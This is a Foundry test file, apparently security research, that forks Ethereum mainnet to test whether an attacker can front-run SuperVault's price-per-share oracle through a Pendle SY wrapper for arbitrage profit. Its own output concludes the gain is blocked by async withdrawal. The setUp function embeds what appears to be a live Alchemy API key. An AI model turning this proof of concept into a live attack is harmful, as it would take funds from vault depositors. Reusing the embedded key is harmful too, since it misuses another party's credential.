// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";

// Interfaces
interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
}

interface IPendleSY {
    function deposit(
        address receiver,
        address tokenIn,
        uint256 amountTokenToDeposit,
        uint256 minSharesOut
    ) external payable returns (uint256 amountSharesOut);

    function redeem(
        address receiver,
        uint256 amountSharesToRedeem,
        address tokenOut,
        uint256 minTokenOut,
        bool burnFromInternalBalance
    ) external returns (uint256 amountTokenOut);

    function exchangeRate() external view returns (uint256);
    function yieldToken() external view returns (address);
    function totalSupply() external view returns (uint256);
    function balanceOf(address) external view returns (uint256);
}

interface ISuperVault {
    function deposit(uint256 assets, address receiver) external returns (uint256 shares);
    function requestRedeem(uint256 shares, address controller, address owner) external returns (uint256);
    function withdraw(uint256 assets, address receiver, address controller) external returns (uint256 shares);
    function convertToAssets(uint256 shares) external view returns (uint256);
    function convertToShares(uint256 assets) external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function totalAssets() external view returns (uint256);
    function balanceOf(address) external view returns (uint256);
    function maxWithdraw(address) external view returns (uint256);
    function strategy() external view returns (address);
}

interface ISuperVaultStrategy {
    function getStoredPPS() external view returns (uint256);
}

interface ISuperVaultAggregator {
    function getPPS(address strategy) external view returns (uint256);
    function forwardPPS(ForwardPPSArgs calldata args) external;
    function isStrategyPaused(address strategy) external view returns (bool);
    function isPPSStale(address strategy) external view returns (bool);

    struct ForwardPPSArgs {
        address[] strategies;
        uint256[] ppss;
        uint256[] timestamps;
        address updateAuthority;
    }
}

contract SuperVaultExploitTest is Test {
    // Contract addresses (Ethereum Mainnet)
    address constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address constant PENDLE_SY = 0x4d654f255d54637112844bd8802b716170904fee;
    address constant SUPER_VAULT = 0xf6ebea08a0dfd44825f67fa9963911c81be2a947;
    address constant STRATEGY = 0x41a9eb398518d2487301c61d2b33e4e966a9f1dd;
    address constant AGGREGATOR = 0x10ac0b33e1c4501cf3ec1cb1ae51ebfdbd2d4698;

    // Test accounts
    address attacker;
    address ppsOracle;

    function setUp() public {
        // Fork Ethereum mainnet
        vm.createSelectFork("https://eth-mainnet.g.alchemy.com/v2/pLXdY7rYRY10SH_UTLBGH");

        attacker = makeAddr("attacker");
        ppsOracle = makeAddr("ppsOracle");

        // Fund attacker with USDC
        deal(USDC, attacker, 10_000_000 * 1e6); // 10M USDC
    }

    function test_CurrentState() public view {
        console.log("=== Current Contract State ===");

        // SuperVault state
        uint256 svTotalSupply = ISuperVault(SUPER_VAULT).totalSupply();
        uint256 svTotalAssets = ISuperVault(SUPER_VAULT).totalAssets();
        uint256 storedPPS = ISuperVaultStrategy(STRATEGY).getStoredPPS();

        console.log("SuperVault totalSupply:", svTotalSupply);
        console.log("SuperVault totalAssets:", svTotalAssets);
        console.log("Stored PPS:", storedPPS);
        console.log("Calculated PPS (assets/supply):", svTotalAssets * 1e6 / svTotalSupply);

        // Pendle SY state
        uint256 syExchangeRate = IPendleSY(PENDLE_SY).exchangeRate();
        uint256 syTotalSupply = IPendleSY(PENDLE_SY).totalSupply();

        console.log("\nPendle SY exchangeRate:", syExchangeRate);
        console.log("Pendle SY totalSupply:", syTotalSupply);

        // Verify exchange rate matches PPS
        uint256 convertedAssets = ISuperVault(SUPER_VAULT).convertToAssets(1e18);
        console.log("\nSuperVault.convertToAssets(1e18):", convertedAssets);
        console.log("Match with exchangeRate:", convertedAssets == syExchangeRate);
    }

    function test_DepositFlow() public {
        console.log("=== Testing Deposit Flow ===");

        uint256 depositAmount = 1_000_000 * 1e6; // 1M USDC

        // Record initial state
        uint256 initialPPS = ISuperVaultStrategy(STRATEGY).getStoredPPS();
        uint256 initialSVTotalSupply = ISuperVault(SUPER_VAULT).totalSupply();

        vm.startPrank(attacker);

        // Approve Pendle SY to spend USDC
        IERC20(USDC).approve(PENDLE_SY, depositAmount);

        // Deposit USDC into Pendle SY
        uint256 syReceived = IPendleSY(PENDLE_SY).deposit(
            attacker,
            USDC,
            depositAmount,
            0 // minSharesOut
        );

        vm.stopPrank();

        // Check results
        console.log("Deposited USDC:", depositAmount);
        console.log("SY tokens received:", syReceived);

        // SY tokens should represent SuperVault shares
        uint256 svSharesExpected = ISuperVault(SUPER_VAULT).convertToShares(depositAmount);
        console.log("Expected SV shares (raw):", svSharesExpected);

        // Verify the value
        uint256 syValueInUSDC = syReceived * ISuperVault(SUPER_VAULT).convertToAssets(1e6) / 1e6;
        console.log("SY value in USDC:", syValueInUSDC);

        // Calculate effective rate
        uint256 effectiveRate = syValueInUSDC * 1e6 / depositAmount;
        console.log("Effective rate (should be ~1.0 minus fees):", effectiveRate);
    }

    function test_OracleFrontRunSimulation() public {
        console.log("=== Oracle Front-Run Simulation ===");

        uint256 depositAmount = 1_000_000 * 1e6; // 1M USDC
        uint256 currentPPS = ISuperVaultStrategy(STRATEGY).getStoredPPS();
        uint256 newPPS = currentPPS * 1005 / 1000; // 0.5% increase

        console.log("Current PPS:", currentPPS);
        console.log("Simulated new PPS (0.5% increase):", newPPS);

        // Step 1: Attacker deposits at OLD PPS (front-running the oracle update)
        vm.startPrank(attacker);
        IERC20(USDC).approve(PENDLE_SY, depositAmount);

        uint256 syReceivedOldPPS = IPendleSY(PENDLE_SY).deposit(
            attacker,
            USDC,
            depositAmount,
            0
        );
        vm.stopPrank();

        console.log("\nStep 1: Deposit at old PPS");
        console.log("SY received:", syReceivedOldPPS);

        // Calculate value at old PPS
        uint256 valueAtOldPPS = syReceivedOldPPS * currentPPS / 1e18;
        console.log("Value at old PPS:", valueAtOldPPS);

        // Step 2: Simulate PPS update (in reality, oracle would update)
        // We can't actually call forwardPPS without being an authorized oracle
        // So we simulate by calculating what the new value would be

        uint256 valueAtNewPPS = syReceivedOldPPS * newPPS / 1e18;
        console.log("\nStep 2: After PPS update to", newPPS);
        console.log("Value at new PPS:", valueAtNewPPS);

        // Step 3: Calculate profit
        int256 profit = int256(valueAtNewPPS) - int256(depositAmount);
        console.log("\nProfit/Loss:", profit);
        console.log("Profit %:", uint256(profit) * 10000 / depositAmount, "bps");

        // Note: This profit can only be realized after async withdrawal completes
        console.log("\n[!] NOTE: Profit requires async withdrawal - cannot be instant");
    }

    function test_PPSStalenessCheck() public view {
        console.log("=== PPS Staleness Analysis ===");

        bool isPaused = ISuperVaultAggregator(AGGREGATOR).isStrategyPaused(STRATEGY);
        bool isStale = ISuperVaultAggregator(AGGREGATOR).isPPSStale(STRATEGY);

        console.log("Strategy paused:", isPaused);
        console.log("PPS stale:", isStale);

        if (!isPaused && !isStale) {
            console.log("\n[OK] Strategy is active and PPS is fresh");
            console.log("Deposits are currently allowed");
        } else {
            console.log("\n[!] Strategy has restrictions");
            if (isPaused) console.log("- Strategy is PAUSED");
            if (isStale) console.log("- PPS is STALE");
        }
    }

    function test_AsyncWithdrawalFlow() public {
        console.log("=== Async Withdrawal Flow ===");

        uint256 depositAmount = 100_000 * 1e6; // 100K USDC

        // First deposit
        vm.startPrank(attacker);
        IERC20(USDC).approve(PENDLE_SY, depositAmount);
        uint256 syReceived = IPendleSY(PENDLE_SY).deposit(attacker, USDC, depositAmount, 0);
        vm.stopPrank();

        console.log("Deposited:", depositAmount / 1e6, "USDC");
        console.log("SY received:", syReceived);

        // Redeem SY to get SuperVault shares
        vm.startPrank(attacker);
        address yieldToken = IPendleSY(PENDLE_SY).yieldToken();
        console.log("\nYieldToken (SuperVault):", yieldToken);

        // Approve and redeem SY
        IERC20(PENDLE_SY).approve(PENDLE_SY, syReceived);
        uint256 svSharesReceived = IPendleSY(PENDLE_SY).redeem(
            attacker,
            syReceived,
            yieldToken, // tokenOut = yieldToken (SuperVault shares)
            0,
            false
        );
        vm.stopPrank();

        console.log("SuperVault shares received:", svSharesReceived);

        // Now attacker has SuperVault shares, must request async redemption
        console.log("\n[!] To withdraw USDC, must:");
        console.log("1. Call SuperVault.requestRedeem(shares, controller, owner)");
        console.log("2. Wait for manager to fulfill");
        console.log("3. Call SuperVault.withdraw() to claim USDC");
        console.log("\nThis is the BLOCKING factor for instant arbitrage!");

        // Check current maxWithdraw (should be 0 before fulfillment)
        uint256 maxWithdraw = ISuperVault(SUPER_VAULT).maxWithdraw(attacker);
        console.log("\nCurrent maxWithdraw for attacker:", maxWithdraw);

        if (maxWithdraw == 0) {
            console.log("[!] No fulfilled redemption requests - cannot withdraw instantly");
        }
    }

    function test_CrossLayerRateConsistency() public view {
        console.log("=== Cross-Layer Rate Consistency Check ===");

        // Get rates from different layers
        uint256 syExchangeRate = IPendleSY(PENDLE_SY).exchangeRate();
        uint256 svPPS = ISuperVaultStrategy(STRATEGY).getStoredPPS();
        uint256 svConvertToAssets = ISuperVault(SUPER_VAULT).convertToAssets(1e18);

        console.log("Pendle SY exchangeRate:", syExchangeRate);
        console.log("SuperVault stored PPS:", svPPS);
        console.log("SuperVault convertToAssets(1e18):", svConvertToAssets);

        // Check consistency
        // SY exchangeRate = SuperVault.convertToAssets(1e18) = 1e18 * PPS / PRECISION
        uint256 expectedFromPPS = 1e18 * svPPS / 1e6;
        console.log("\nExpected from PPS calculation:", expectedFromPPS);

        bool consistent = (syExchangeRate == svConvertToAssets) && (svConvertToAssets == expectedFromPPS);
        console.log("All rates consistent:", consistent);

        if (!consistent) {
            console.log("\n[!!!] RATE INCONSISTENCY DETECTED");
            console.log("This could indicate an arbitrage opportunity!");
        } else {
            console.log("\n[OK] All rates are consistent - no immediate arbitrage");
        }
    }
}
